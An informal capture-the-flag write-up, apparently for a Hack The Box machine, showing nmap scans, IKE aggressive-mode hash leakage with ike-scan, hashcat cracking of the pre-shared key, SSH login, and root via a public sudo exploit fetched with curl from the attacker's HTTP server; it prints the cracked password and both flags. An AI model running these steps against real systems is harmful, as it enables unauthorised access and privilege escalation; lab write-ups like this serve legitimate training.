
they have given the ip address , and then i started with the nmap -sV 10.129.238.52
it shows that 
```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-10 21:48 IST
Nmap scan report for 10.129.238.52
Host is up (0.27s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.84 seconds

```

and then i used to nmap to find the any UDP port available with the command nmap -sU --top-ports=20 10.129.238.52 

```
sudo nmap -sU 10.129.238.52 --top-ports=20
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-10 21:57 IST
Nmap scan report for 10.129.238.52
Host is up (0.33s latency).

PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   closed        ntp
135/udp   open|filtered msrpc
137/udp   closed        netbios-ns
138/udp   closed        netbios-dgm
139/udp   closed        netbios-ssn
161/udp   closed        snmp
162/udp   open|filtered snmptrap
445/udp   closed        microsoft-ds
500/udp   open          isakmp
514/udp   open|filtered syslog
520/udp   closed        route
631/udp   closed        ipp
1434/udp  open|filtered ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp closed        unknown

Nmap done: 1 IP address (1 host up) scanned in 20.07 seconds
```

And i browse the what service is running in the UDP port 500  , it says the IKE and IPsec and then browse what is IKE(internet key exchange) that is it used in the VPN gateways , that is , it is used to make the secure connection and then IPsec is for the internet protocol security it is used to share the data secure 

It protects data by:

- encrypting packets
    
- authenticating packets
    
- preventing tampering
    

So IPSec is responsible for **secure data transmission**.


then i use the ike-scan with the ipaddress ,
```
ike-scan -M -A --pskcrack=k.hash 10.129.238.52

Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.238.52   Main Mode Handshake returned
        HDR=(CKY-R=0e0ff99ab4b588c2)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.384 seconds (2.60 hosts/sec).  1 returned handshake; 0 returned notify

```

here the enc is 3DES and the hash SHA1 and the AUTH is PSK (preshared key)

Where , m stands for the Main Mode Handshake , by using the aggressive scanning the IKE will leak the hash , 

```
ike-scan -M -A --pskcrack=k.hash 10.129.238.52
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.238.52   Aggressive Mode Handshake returned
        HDR=(CKY-R=160e032b43cbec56)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.579 seconds (1.73 hosts/sec).  1 returned handshake; 0 returned notify
```

and the k.hash will download and then using the hashcat we decode that the password is `reakingrockstarontheroad`

and with the using the ssh ike@ip-address , it ask the password , type `reakingrockstarontheroad`
and then we login and by cat user.txt the flag is `872d599af2d8d597d6fd4678c41644c2`

and then we need to change the role to root , for that the bug is sudo's version , it is `1.9.17`

and the by using the github repo , git clone https://github.com/kh4sh3i/CVE-2025-32463
and we need to use the `python3 -m http.server 8000` in the kali machine and then `curl 10.10.15.174:8000/exploit.sh -LO` and the exploit.sh is download and the by change the permission and the run the file , it make us root and read the root.txt `fd43493267746d93fb25ff775e83b1f4`


